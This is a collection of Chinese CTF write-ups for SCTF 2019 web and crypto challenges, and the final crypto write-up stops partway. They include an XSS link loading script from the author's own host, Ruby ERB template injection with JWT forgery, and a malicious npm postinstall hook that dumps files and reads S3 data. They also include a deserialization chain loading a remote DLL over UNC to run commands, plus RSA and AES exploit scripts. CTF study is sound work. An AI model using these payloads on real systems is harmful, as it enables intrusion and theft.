# 2019SCTF
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|难|

# 题目下载：
+ 暂无

# 网上公开WP:
+ https://www.xctf.org.cn/library/details/e79537ac55b532b974acc27ae514480068344dca/
+ https://www.zhaoj.in/read-5985.html
+ https://xz.aliyun.com/t/5478
+ https://xz.aliyun.com/t/5474
+ https://www.anquanke.com/post/id/181019

# 本站备份WP
**感谢作者：glazjin、SU、De1ta**

## Web
### math-is-fun1

![](https://ctfwp.wetolink.com/2019sctf/0.png)

知识点：利用外部组件进行的反射型 XSS

步骤：

1.打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019sctf/1.png)

似乎要提交给管理员页面来看，页面没看到有可以提交进行储存的地方。

2.然后来看看页面源码。

![](https://ctfwp.wetolink.com/2019sctf/2.png)

这个地方似乎可控，来试试。

![](https://ctfwp.wetolink.com/2019sctf/3.png)

Nice，可以。

3.再来看看下面的 js。

![](https://ctfwp.wetolink.com/2019sctf/4.png)

可以看到，其对 config 进行解析，首先处理换行，而后对其进行解析 

`-config['name']=value`会被赋值到 window 的config里的 name value。

`-name=value`的会被赋值到 window 的 name，值为 value。

4.那么看看有什么地方读了 window 的，可以看到这里加载了 mathjax  来处理数学公式的显示。

![](https://ctfwp.wetolink.com/2019sctf/5.png)

5.点击进去看看源码，搜索 window，还真调用了。

![](https://ctfwp.wetolink.com/2019sctf/6.png)

![](https://ctfwp.wetolink.com/2019sctf/7.png)

可以看到其在初始化时将 window 里已有的 MathJax 存到自身的 AuthorConfig 里，而后其会读取这个设置，将里面的 root 作为组件的 root 进行设置。

![](https://ctfwp.wetolink.com/2019sctf/8.png)

那么就好办了，我们就构造一个参数，使其从我们的网站上加载我们的 js，这样想做啥都可以了，很棒的是这样加载不受 CSP 之类的限制，美滋滋。

6.构造如下，

http://47.110.128.101/challenge?name=glzjin%3b%0aMathJax%3d%7b”root”%3a”http%3a%2f%2fxss.zhaoj.in%2fmath”%7d

name那里其实为 

```
glzjin;
MathJax={"root":"http://xss.zhaoj.in/math"}
```

这样就达到我们之前想达到的目的了。

7.把这个链接打过去，就可以看到 XSSBOT 加载了什么资源了。

祖传算号器：

```
import string, hashlib

a = string.digits + string.lowercase + string.uppercase
for i in a:
	for j in a:
		for k in a:
			for m in a:
				s = hashlib.md5(i + j + k + m).hexdigest()[0:5]
				if s == "5e86c":
					print(i + j + k + m)
					exit(0)
```

打

![](https://ctfwp.wetolink.com/2019sctf/9.png)

看我自己服务器日志，得

![](https://ctfwp.wetolink.com/2019sctf/10.png)

说明：这里其实我原本是直接在浏览器上看了看资源加载，没想到正常版的 Chrome 和 XSSBOT 的 headless Chrome 还有所不同，正常版 Chrome 加载的资源和 headless 的不同，错失一血-

8.在服务器上创建一个这个路径的文件，

![](https://ctfwp.wetolink.com/2019sctf/11.png)

![](https://ctfwp.wetolink.com/2019sctf/12.png)

9.再打一遍。收 XSS。

![](https://ctfwp.wetolink.com/2019sctf/13.png)

![](https://ctfwp.wetolink.com/2019sctf/14.png)

10.Flag 到手~

### math-is-fun2

![](https://ctfwp.wetolink.com/2019sctf/15.png)

同上一题，不再赘述

### flag shop

![](https://ctfwp.wetolink.com/2019sctf/16.png)

知识点：Ruby ERB SSTI

备注：Ruby 摸得少，搜了一个下午都没搜到 Ruby 的全局变量 &#8211; -后来结束了和出题人 evoA  师傅一聊才知道得用美元符号的全局变量，哭了。在这里也还是写写 WriteUp 记录下。

步骤：

1、打开靶机，发现是这样一个页面。

![](https://ctfwp.wetolink.com/2019sctf/17.png)

2、看下页面源码，主要关注后面这一段，先获取信息，失败就去请求 auth。

![](https://ctfwp.wetolink.com/2019sctf/18.png)

auth 之后会得到一个 jwt token。看来之后的请求我们也得带上这个。

![](https://ctfwp.wetolink.com/2019sctf/19.png)

2、扫下敏感文件，有 robots.txt。

![](https://ctfwp.wetolink.com/2019sctf/20.png)

3、访问一下这个路径，是源码。

```
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
#ENV["SECRET"] = SecureRandom.hex(xx)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
	if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
	  puts ENV["FLAG"]
	end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

	auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
	auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
	cookies[:auth] = auth
	ERB::new("&lt;script>alert('#{params[:name][0,7]} working successfully!')&lt;/script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] &lt; FLAGPRICE then

	json({title: "error",message: "no enough jkl"})
  else

	auth &lt;&lt; {flag: ENV["FLAG"]}
	auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
	cookies[:auth] = auth
	json({title: "success",message: "jkl is good thing"})
  end
end

def islogin
  if cookies[:auth].nil? then
	redirect to('/shop')
  end
end
```

4、可以看到 /work 那里有 ERB 模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。比如 `name=<%=1%>`，就会得 1。

![](https://ctfwp.wetolink.com/2019sctf/21.png)

![](https://ctfwp.wetolink.com/2019sctf/22.png)

5、 继续看看源码，同时注意有这样一段意义不明的代码。似乎得传入 SECRET 参数。那么就一起带上。

```
unless params[:SECRET].nil?
	if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
	  puts ENV["FLAG"]
	end
  end
```

5、对照 [Ruby 全局变量表](https://blog.csdn.net/zdq0394123/article/details/8443694) ，不断 fuzz，发现$`有东西，

![](https://ctfwp.wetolink.com/2019sctf/23.png)

![](https://ctfwp.wetolink.com/2019sctf/24.png)

回溯到源码看看

```
unless params[:SECRET].nil?
	if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
	  puts ENV["FLAG"]
	end
  end
```

其在模板渲染之前之前有个匹配，就是这里。要是 SECRET 参数存在则对其进行匹配，用传入的这个值去和 `ENV["SECRET"]` 匹配，匹配上了就往终端输出 FLAG。意义不明的代码，但这里既然有匹配，就可以用全局变量读出来了，也就是用 $` 来读取匹配前的内容。

那么这里读出来的就是 ENV 的 SECRET 的一部分了。

6、然后我们 SECRET 不传试试，这样括号里的匹配就不进行，只进行括号外的 ENV[&#8220;SECRET&#8221;] 的匹配，再用全局变量 $` 就可以读出 ENV[&#8220;SECRET&#8221;] 了。

![](https://ctfwp.wetolink.com/2019sctf/25.png)

![](https://ctfwp.wetolink.com/2019sctf/26.png)

7、拿到了 secret 之后，到 jwt.io 伪造一下 cookie 里的 auth 里存的 jwt 令牌。jkl 设置为 **2000000000000000000000000000** 。

![](https://ctfwp.wetolink.com/2019sctf/27.png)

8、置 cookie，买 flag。

![](https://ctfwp.wetolink.com/2019sctf/28.png)

![](https://ctfwp.wetolink.com/2019sctf/29.png)

9、然后再解析一下新的 jwt token。

![](https://ctfwp.wetolink.com/2019sctf/30.png)

![](https://ctfwp.wetolink.com/2019sctf/31.png)

10、Flag 到手~

### easy-web

![](https://ctfwp.wetolink.com/2019sctf/32.png)

知识点：RCE点找寻（预期解），NPM 包特性（非预期解）

备注：这题做出来之后和出题人 l0ca1  师傅聊了聊，发现是有 RCE 点的，在传入包名那- -不过到后面我这种蛇皮做法个人觉得反倒还方便些。以下我就写写自己的方法吧。

步骤：

1、打开靶机，是这样一个页面。

![](https://ctfwp.wetolink.com/2019sctf/33.png)

2、看看源码，是 vue 写的。

![](https://ctfwp.wetolink.com/2019sctf/34.png)

3、看下 app.js，找出其中的接口。

![](https://ctfwp.wetolink.com/2019sctf/35.png)

4、分析文件，

看到如下几个点

[![](https://ctfwp.wetolink.com/2019sctf/36.png)](https://www.zhaoj.in/wp-content/uploads/2019/06/15613036536833a4fe165f2e8294c8c6c50e518acb.png)

提示 `{"npm":["jquery","moment"]}` ,其功能为下载 npm包打包之后提供二次下载。

![](https://ctfwp.wetolink.com/2019sctf/37.png)

![](https://ctfwp.wetolink.com/2019sctf/38.png)

提示 key 为 abcdefghiklmn123，接口地址 /upload。

经过观察，测试，得到该接口的正确用法：

[![](https://ctfwp.wetolink.com/2019sctf/39.png)](https://www.zhaoj.in/wp-content/uploads/2019/06/15613040245952d03c97c1fde228e4ef9544178a99.png)

5、然后参考 [https://juejin.im/post/5971aa866fb9a06bb5406c94](https://juejin.im/post/5971aa866fb9a06bb5406c94) 自己来构造一个包，里面不需要有实际内容，主要利用 npm 包 package json 里 script 段的 postinstall 配置，这种攻击在现实中也出现过。[https://www.anquanke.com/post/id/85150](https://www.anquanke.com/post/id/85150)

构建步骤：

```
> mkdir glzjintest1
>cd glzjintest1
>npm init1
```

![](https://ctfwp.wetolink.com/2019sctf/40.png)

新建一个 index.js，内容如下

```
exports.showMsg = function () {
  console.log("This is my first module");
};
```

编辑 package.json，

```
{
  "name": "glzjintest1",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
	"postinstall": "grep -rn 'sctf' / > result.txt; exit 0"
  },
  "author": "",
  "license": "ISC"
}
```

主要是改 scripts，postinstall 里面为你想执行的命令。这里我主要是想搜搜有没有 flag。

然后是推送包到 npmjs，

```
> npm login
> npm publish
```

![](https://ctfwp.wetolink.com/2019sctf/41.png)

6、然后请求靶机，让其下载这个包。

![](https://ctfwp.wetolink.com/2019sctf/42.png)

7、我们把返回的 URL 所指向的压缩包下载下来解压看看，可以看到我们的命令执行结果。没找到像 flag 的文件。

![](https://ctfwp.wetolink.com/2019sctf/43.png)

8、似乎 /var/task 是程序所在目录，打个包下下来看看。

继续修改 package.json，版本升级下，推包。

```
{
  "name": "glzjintest1",
  "version": "1.0.3",
  "description": "",
  "main": "index.js",
  "scripts": {
	"postinstall": "tar cvzf result.tar.gz /var/task/; exit 0"
  },
  "author": "",
  "license": "ISC"
}
```

![](https://ctfwp.wetolink.com/2019sctf/44.png)

然后继续让靶机下载咱们这个包。

![](https://ctfwp.wetolink.com/2019sctf/45.png)

解压 result.tar.gz

![](https://ctfwp.wetolink.com/2019sctf/46.png)

9、审计源码 index.js

```
const koa = require("koa");
const AWS = require("aws-sdk");
const bodyparser = require('koa-bodyparser');
const Router = require('koa-router');
const async = require("async");
const archiver = require('archiver');
const fs = require("fs");
const cp = require("child_process");
const mount = require("koa-mount");
const cfg = {
	"Bucket":"static.l0ca1.xyz",
	"host":"static.l0ca1.xyz",
}

function getRandomStr(len) {
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 0; i &lt; len; i++)
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	return text;
};
function zip(archive, output, nodeModules) {
	const field_name = getRandomStr(20);
	fs.mkdirSync(`/tmp/${field_name}`);
	archive.pipe(output);
	return new Promise((res, rej) => {
		async.mapLimit(nodeModules, 10, (i, c) => {
			process.chdir(`/tmp/${field_name}`);
			console.log(`npm --userconfig='/tmp' --cache='/tmp' install ${i}`);
			cp.exec(`npm --userconfig='/tmp' --cache='/tmp' install ${i}`, (error, stdout, stderr) => {
				if (error) {
					c(null, error);
				} else {
					c(null, stdout);
				}
			});
		}, (error, results) => {
			archive.directory(`/tmp/${field_name}/`, false);
			archive.finalize();
		});
		output.on('close', function () {
			cp.exec(`rm -rf /tmp/${field_name}`, () => {
				res("");
			});
		});
		archive.on("error", (e) => {
			cp.exec(`rm -rf /tmp/${field_name}`, () => {
				rej(e);
			});
		});
	});
}

const s3Parme = {
	// accessKeyId:"xxxxxxxxxxxxxxxx",
	// secretAccessKey:"xxxxxxxxxxxxxxxxxxx",
}
var s3 = new AWS.S3(s3Parme);
const app = new koa();
const router = new Router();
app.use(bodyparser());
app.use(mount('/static',require('koa-static')(require('path').join(__dirname,'./static'))));
router.get("/", async (ctx) => {
	return new Promise((resolve, reject) => {
		fs.readFile(require('path').join(__dirname, './static/index.html'), (err, data) => {
			if (err) {
				ctx.throw("系统发生错误,请重试");
				return;
			};
			ctx.type = 'text/html';
			ctx.body = data.toString();
			resolve();
		});
	});
})
.post("/login",async(ctx)=>{
	if(!ctx.request.body.email || !ctx.request.body.password){
		ctx.throw(400,"参数错误");
		return;
	}
	ctx.body = {isUser:false,message:"用户名或密码错误"};
	return;
})
.post("/upload", async (ctx) => {
	const parme = ctx.request.body;
	const nodeModules = parme.npm;
	const key = parme.key;
	if(typeof key == "undefined" || key!="abcdefghiklmn123"){
		ctx.throw(403,"请求失败");
		return;
	}
	if (typeof nodeModules == "undefined") {
		ctx.throw(400, "JSON 格式错误");
		return;
	}
	const zipFileName = `${getRandomStr(20)}.zip`;
	var output = fs.createWriteStream(`/tmp/${zipFileName}`, { flags: "w" });
	var archive = archiver('zip', {
		zlib: { level: 9 },
	});
	try {
		await zip(archive, output, nodeModules);
	} catch (e) {
		console.log(e);
		ctx.throw(400,"系统发生错误,请重试");
		return;
	}
	const zipBuffer = fs.readFileSync(`/tmp/${zipFileName}`);
	const data = await s3.upload({ Bucket: cfg.Bucket, Key: `node_modules/${zipFileName}`, Body: zipBuffer ,ACL:"public-read"}).promise().catch(e=>{
		console.log(e);
		ctx.throw(400,"系统发生错误,请重试");
		return;
	});
	ctx.body = {url:`http://${cfg.host}/node_modules/${zipFileName}`};
	cp.execSync(`rm -f /tmp/${zipFileName}`);
	return;
})
app.use(router.routes());

if (process.env &amp;&amp; process.env.AWS_REGION) {
	require("dns").setServers(['8.8.8.8','8.8.4.4']);
	const serverless = require('serverless-http');
	module.exports.handler = serverless(app, {
		binary: ['image/*', 'image/png', 'image/jpeg']
	});
}else{
	app.listen(3000,()=>{
		console.log(`listening 3000......`);
	});
}
```

可以看到包是存在 亚马逊 s3 上的，而且在最后几行可以看出这个程序似乎是跑在亚马逊的 serverless 服务上的。

10、那么就来写个 nodejs 看看 s3 的  bucket 里有啥吧，把我们的包改下。

package.json 改为如下内容，版本升级，依赖加上，命令执行上。

```
{
  "name": "glzjintest1",
  "version": "1.0.7",
  "description": "",
  "main": "index.js",
  "scripts": {
	"postinstall": "cp index.js ../../test.js &amp;&amp; cd ../../ &amp;&amp; node test.js > result.txt; exit 0"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
	"aws-sdk": "^2.449.0"
  }
}
```

命令那里我复制到上上级 &#8211; -为了不重复下载依赖- -使得包太大。

index.js 改为如下内容：

```
const AWS = require("aws-sdk");

const s3Parme = {
	// accessKeyId:"xxxxxxxxxxxxxxxx",
	// secretAccessKey:"xxxxxxxxxxxxxxxxxxx",
}

var s3 = new AWS.S3(s3Parme);

// Create the parameters for calling listObjects
var bucketParams = {
  Bucket : 'static.l0ca1.xyz',
};

// Call S3 to obtain a list of the objects in the bucket
s3.listObjects(bucketParams, function(err, data) {
  if (err) {
	console.log("Error", err);
  } else {
	console.log("Success", data);
  }
});

exports.showMsg = function () {
  console.log("This is my first module");
};
```

读出 s3 里存的东西，从 serverless 里连接是不需要凭证的。

然后让靶机下载这个包。

![](https://ctfwp.wetolink.com/2019sctf/47.png)

解压，看到开头有个 flag 文件。

![](https://ctfwp.wetolink.com/2019sctf/48.png)

11、继续更改 package.json，提升版本。

```
{
  "name": "glzjintest1",
  "version": "1.1.0",
  "description": "",
  "main": "index.js",
  "scripts": {
	"postinstall": "cp index.js ../../test.js &amp;&amp; cd ../../ &amp;&amp; node test.js > result.txt; exit 0"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
	"aws-sdk": "^2.449.0"
  }
}
```

然后修改 index.js，为其添加读取这个 flag 文件的代码。

```
const AWS = require("aws-sdk");

const s3Parme = {
	// accessKeyId:"xxxxxxxxxxxxxxxx",
	// secretAccessKey:"xxxxxxxxxxxxxxxxxxx",
}

var s3 = new AWS.S3(s3Parme);

// Create the parameters for calling listObjects
var bucketParams = {
  Bucket : 'static.l0ca1.xyz',
};

// Call S3 to obtain a list of the objects in the bucket
s3.listObjects(bucketParams, function(err, data) {
  if (err) {
	console.log("Error", err);
  } else {
	console.log("Success", data);
  }
});

var fileParam = {
  Bucket : 'static.l0ca1.xyz',
  Key: 'flaaaaaaaaag/flaaaag.txt'
};

s3.getObject(fileParam, function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});

exports.showMsg = function () {
  console.log("This is my first module");
};
```

推包，让靶机下载。

![](https://ctfwp.wetolink.com/2019sctf/49.png)

![](https://ctfwp.wetolink.com/2019sctf/50.png)

下载回来，解压，得到文件内容。

![](https://ctfwp.wetolink.com/2019sctf/51.png)

![](https://ctfwp.wetolink.com/2019sctf/52.png)

解码下就是 flag。

![](https://ctfwp.wetolink.com/2019sctf/53.png)

12、Flag 到手~

### babyEoP

>出题人：Jaylin
解题人数：0
最终分数：1000

题目给了一个webshell，弱密码直接进去。

Tomcat启用了 Security Manager，webshell基本所有功能无法正常使用，但是可以查看有限的几个目录文件，无写权限。

如果顺利，应该可以收集到以下信息：

+ cookie处存在反序列化的点，有反序列化漏洞。
+ 查看lib目录，存在 `commons-collections 3.1 gadget`。
+ 找到 catalina.policy 文件，是Tomcat默认的安全策略配置文件，这应该是本题可能有点脑洞的地方，因为没有给 `C:/babyEoP/apache-tomcat-8.5.42` 的读权限，所以无法列目录，但是 conf 目录是可读的。（有将近10位选手读到了这个文件hhhh。）

我在官方提供的 catalina.policy 的基础上，做了一些修改。给了 LoadLibrary 、 createClassLoader、 accessDeclaredMembers 几个重要权限。

分析 policy ，应该很容易可以想到，要通过 JNI 绕过 Security Manager。但是 JNI 需要加载一个 dll 动态链接库，由于并没有给任何写权限，所以是不可能上传 dll 的。

并且，webshell 的 Eval Code 使用时，需要向当前目录写一个 tmp.jsp 文件，所以也是不能用的（不要想着用这个执行代码）。

那么该如何才能执行代码来加载一个不在本地的dll呢？

下面是具体的解题思路：

题目已经给了反序列化的点以及gadget，可以通过这个来执行代码。

>ysoserial 的 commons-collections 利用链提供了几个直接执行命令的 gadget，但是都是基于 Runtime.exec 的，并没有给这个权限。So 想要直接利用是不行的。

但是直接用 gadget 构造出加载dll可能比较困难，所以这里可以利用稍微高级一点的方法——加载外部的jar来执行代码。

构造见https://github.com/Jayl1n/ysoserial/blob/master/src/main//ysoserial/payloads/CommonsCollections8.

下面要加载 dll，用 JNI 绕 JSM。

同样因为没有写权限，且 dll 无法一起打包到 jar 里，所以要从网络上加载 dll。

这里利用 System.load 的一个特性——可以使用 UNC 路径，加载远程的 dll。

为什么可以使用 UNC 呢？来看下 System.load 的调用过程。

System.load

![](https://ctfwp.wetolink.com/2019sctf/54.png)

调用了 `Runtime.getRuntime().load0`

1.Runtime.getRuntime().load0

![](https://ctfwp.wetolink.com/2019sctf/55.png)

在这里会判断 filename 是否是一个绝对路径，如果不是就直接抛出异常，是就进一步加载。

1.File.isAbsolute

![](https://ctfwp.wetolink.com/2019sctf/56.png)

再看看 File 是如何判断是否是绝对路径的。

根据描述，linux下要求以 `/` 开头。windows下，要求以盘符或者 `\\\\`开头。

emm 综上，所以这里可以使用 UNC 路径。

下面是另一个坑，UNC 默认是走 445 端口的，如果没有特殊情况，公网上都是屏蔽了这个端口的。

这里利用 windows 一个特性，在开启了 webclient 服务的情况下，UNC 访问 445 失败时，会尝试访问目标服务器80端口的 webdav 去加载资源 (‾◡◝)， 这一点 hint 已经提示过了。

EXP
类
R.

```
public class R { static { System.load("\\xxx.xxx.xxx.xxx\JNI.dll"); }

public static native void exec(String cmd);
public R(String cmd) {
    exec(cmd);
}
} 
```

执行命令

`c R. jar cvf R.jar R.class`

将打包的 R.jar 放到服务器上的 web 服务下。

DLL
R.h
```
ifdef __cplusplus
extern "C" {

endif
JNIEXPORT void JNICALL _R_exec
(JNIEnv *, jclass, jstring);
ifdef __cplusplus
}

endif
endif
```

R.cpp

```
include "R.h"
include
JNIEXPORT void JNICALL _R_exec (JNIEnv env, jclass clazz, jstring str) { char cmd= (char*)env->GetStringUTFChars(str,JNI_FALSE); system(cmd); env->ReleaseStringUTFChars(str,cmd); } 
```

编译成 dll，放到服务器的 webdav 服务下。

用https://github.com/Jayl1n/ysoserial/blob/master/src/main//ysoserial/payloads/CommonsCollections8. 构造序列化 payload，贴到 cookie 里打一发，完事儿~

## Crypto
### babygame
作者：De1ta、来源：[安全客](https://www.anquanke.com/post/id/181019)

题目首先需要proof_of_work，要求m和rsa加密m之后再解密的结果不相同，让m比n大即可绕过

进入系统之后有两个选项

1.随机生成三组不同的a，b，n，使用相同的e=3，使得`c=pow(a*m+b,e,n)`，然后会给我们三组不同的a，b，n和c。最后再使用aes_ofb加密m，将结果也给我们。其中aes的iv和key都是随机生成的

2.我们需要输入aes_ofb加密之后的m的结果，其中m需要将其中的afternoon替换为morning，如果构造的正确则返回flag
解题思路：

1.通过Broadcast Attack with Linear Padding解出m为”I will send you the ticket tomorrow afternoon”

2.将m，修改后的m，以及aes_ofb加密之后的m的结果进行异或，得到的最终结果就是修改后的m进行aes_ofb加密之后的结果。将此结果发送给服务器便得到flag

`sctf{7h15_ch4ll3n63_15_n07_h4rd_f0r_y0u_r16h7?}`

解题脚本:

1.hastads.sage
```
def hastads(cArray,nArray,e=3):
    """
    Performs Hastads attack on raw RSA with no padding.
    cArray = Ciphertext Array
    nArray = Modulus Array
    e = public exponent
    """

    if(len(cArray)==len(nArray)==e):
        for i in range(e):
            cArray[i] = Integer(cArray[i])
            nArray[i] = Integer(nArray[i])
        M = crt(cArray,nArray)
        return(Integer(M).nth_root(e,truncate_mode=1))
    else:
        print("CiphertextArray, ModulusArray, need to be of the same length, and the same size as the public exponent")


def linearPaddingHastads(cArray,nArray,aArray,bArray,e=3,eps=1/8):
    """
    Performs Hastads attack on raw RSA with no padding.
    This is for RSA encryptions of the form: cArray[i] = pow(aArray[i]*msg + bArray[i],e,nArray[i])
    Where they are all encryptions of the same message.
    cArray = Ciphertext Array
    nArray = Modulus Array
    aArray = Array of 'slopes' for the linear padding
    bArray = Array of 'y-intercepts' for the linear padding
    e = public exponent
    """
    if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == e):
        for i in range(e):
            cArray[i] = Integer(cArray[i])
            nArray[i] = Integer(nArray[i])
            aArray[i] = Integer(aArray[i])
            bArray[i] = Integer(bArray[i])
        TArray = [-1]*e
        for i in range(e):
            arrayToCRT = [0]*e
            arrayToCRT[i] = 1
            TArray[i] = crt(arrayToCRT,nArray)
        P.<x> = PolynomialRing(Zmod(prod(nArray)))
        gArray = [-1]*e
        for i in range(e):
            gArray[i] = TArray[i]*(pow(aArray[i]*x + bArray[i],e) - cArray[i])
        g = sum(gArray)
        g = g.monic()
        # Use Sage's inbuilt coppersmith method
        roots = g.small_roots(epsilon=eps)
        if(len(roots)== 0):
            print("No Solutions found")
            return -1
        return roots[0]

    else:
        print("CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length," +
         "and the same size as the public exponent")

def LinearPadding():
    import random
    import binascii

    e = 3

    nArr = [
        0x81e620887a13849d094251e5db9b9160d299d2233244876344c0b454c99f7baf9322aa90b371f59a8ed673f666137df1f1e92d86e7b036479a2519827a81c7648543e16d4d0a334d0aa1124ad4c794298c3a227abfe1d44470ad4649609630450cb83f42f68ff2c445aaf546483b7a2b0a6e5877634ace5e640f8d8cbdc6a379,
        0x6c7c7935c58a586cf45e2e62ee51f6619ae2f6a7cef3865ed40a0d62ec31ba612e81045bcc6e50aa41d225b0f92b0d4a40051e2cf857ba61e91619e8fb3e2691d276c1abb5231c8012deb449e85752d2a02119bb186da6f7d41d704261284b395eec17ed4a2b07d1b97e34db8164e3093dd6cffbb0119ef8b3e9e960b0d96d05,
        0x5e67f4953462f66d217e4bf80fd4f591cbe22a8a3eac42f681aea880f0f90e4a34aca250b01754dd49d3b7512011609f757cbaf8ae7c97d5894fb92fb36595aff4a1303d01e5c707284bbfdc20b8378e046650675353e471853fa294f779df7b1b3f7cbe1748c2109d22cea682b01cb2c7719df03783e66cc3e44889a002c517]
    cArr = [
        0x3512b763bab0b45b2c6941cccd550c8b2628cea0f162dc3902951e48115d58d16ea25075da6331617e7a4ac6062190f8ce91c65c91cff57a845a21d2ebd792b46bdcb666bc4aeab2232f990956084003b652664444ba0255dbab16620b2b232a1a4e6ec04e24249ff7ba33c70cb98c50d1f46bed076c53e2c95d0ec7dee5ad2f,
        0x36bfe6fba6f34b93a0d2d44c890dfe44afc715a586bc1a44aa184571bb88a238187024b36b22a1f52a64f553fb52cf7ce193937e047307dd62e4c980601a3d20b1fbfe69888992726b11bf20330e48e4a64c6d4825d1c6d058d745f5a709c2ab5ac86da1feacf13e9de2237426b70a17a56d201b4743c68b70fdd4c7ce5eaa3,
        0x4961ba65469dfc17e663af04dfb8eeee16c61df4f85971495d0c7e7061040602638963651791cfad28992312309c3179da27babf2a80fe41c062b21aa922da53bd793c614a0974ec5e5e18f9696df875e98aceef17d476d7615ea304e7e9869696711016151666f6b58f31241c590b3b313009434b444bcb7694bb8309d89475]
    aArr = [
        0xd0f458bc246d88f38e78076b36ad58981928594035b9e428401dc3ccf049a8012926dffb5be9fa225e8e128370581acc79ee24fa259d4ea895ce61d3d607ed2b,
        0xfbedf9c34170262e2ed0eee7512e935715400a8ce541285c98e5269d2cdf4dc1aa81e117bf5d62a3310064376e8c3d5d5c4fa67e5a434ad93e5875eaa7be9545,
        0xa2995200a4f252d7ba9959a3b7d51c4b138f3823869f71573f4ab61c581ce8879d40396a33ddc32a93fd100a1029dba53e41a0acbe9e023a0bf51c6e4ddc911d]
    bArr = [
        0xc2a6d47dc16824c86e92a9e88a931d215846052fe6787c11d0fcd9f4dde28f510707c33948290f69644a7fa64075d85e7761cfff3c627ee5156a03bd9f241c51,
        0xc2343fdbb6a351b387174db494e03d0879bea084e65b16f3f0ad106472bd3974813aec28a01fcceeae00db6d38b6c32bb6ce900dff236ae9c5814ad089591115,
        0xc4a2fb937c7441be58bfcb06208e0987423ab577041d0accf1f446545b9ebb7e4874fc56597ab1b842bb50e364a62f07a0afe7d6eff7a805361f8d3a12e79d65]
    randUpperBound = pow(2,500)

    msg = linearPaddingHastads(cArr,nArr,aArr,bArr,e=e,eps=1/8)
    msg = hex(int(msg))[2:]
    if(msg[-1]=='L'):
        msg = msg[:-1]
    if(len(msg)%2 == 1):
        msg = '0' + msg
    print(msg)
    print(binascii.unhexlify(msg))

if __name__ == '__main__':
    LinearPadding()
```
2.exp.py
```
HOST = "47.240.41.112"
PORT = 54321

from Crypto.Util.strxor import strxor
from pwn import *

def pad(msg):
    pad_length = 16 - len(msg) % 16
    return msg + chr(pad_length) * pad_length

r = remote(HOST, PORT) 
ru = lambda x : r.recvuntil(x)
rl = lambda  : r.recvline()
sl = lambda x : r.sendline(x)

# Give a large number bigger than n to break proof_of_work
ru('{65537, ')
n = ru('L}').strip('L}')
n = int(n[2:],16)
ru('Give me something you want to encrypt:')
sl(str(n**2))

# pad the message and target message we got in the first step
msg = pad("I will send you the ticket tomorrow afternoon")
target_msg = pad("I will send you the ticket tomorrow morning")

ru('message')
sl('1')
ru('this:')
message = ((ru('n').strip(' ')).strip('n')).decode('hex')
ru('message')

# message xor enc_message = middle_key_stream, middle_key_stream xor target_message = enc_target_message, so enc_target_message = xor(message,enc_message,target_message)
enc_target_message = strxor(strxor(target_msg,message),msg).encode('hex')

# choice 2 and send enc_target_message to get flag
sl('2')
ru('now:')
sl(enc_target_message)
flag = ru('}')
print "[+]FLAG IS: "+flag
r.close()
```

### warmup

![](https://ctfwp.wetolink.com/2019sctf/57.png)

知识点：代码审计，AES加密

附件：

[156129204983f46d45981f08ab9fa977a24d3c70ec.zip](https://www.zhaoj.in/wp-content/uploads/2019/06/156129204983f46d45981f08ab9fa977a24d3c70ec.zip)

步骤：

1.打开审计一下源码，发现是 AES 加密。

```
#!/usr/bin/python
# -*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util.strxor import strxor
from Crypto.Random import get_random_bytes
from FLAG import flag

class MAC:
	def __init__(self):
		self.key = get_random_bytes(16)
		self.iv = get_random_bytes(16)

	def pad(self, msg):
		pad_length = 16 - len(msg) % 16
		return msg + chr(pad_length) * pad_length

	def unpad(self, msg):
		return msg[:-ord(msg[-1])]

	def code(self, msg):
		res = chr(0)*16
		for i in range(len(msg)/16):
			res = strxor(msg[i*16:(i+1)*16], res)
		aes = AES.new(self.key, AES.MODE_CBC, self.iv)
		return aes.encrypt(res).encode('hex')

	def identity(self, msg, code):
		if self.code(msg) == code:
			msg = self.unpad(msg)
			if msg == 'please send me your flag':
				print 'remote: ok, here is your flag:%s' % flag
			else:
				print 'remote: I got it'
		else:
			print 'remote: hacker!'

if __name__ == '__main__':
	mac = MAC()
	message = 'see you at three o\'clock tomorrow'
	print 'you seem to have intercepted something:{\%s:\%s}' %(mac.pad(message).encode('hex'), mac.code(mac.pad(message)))
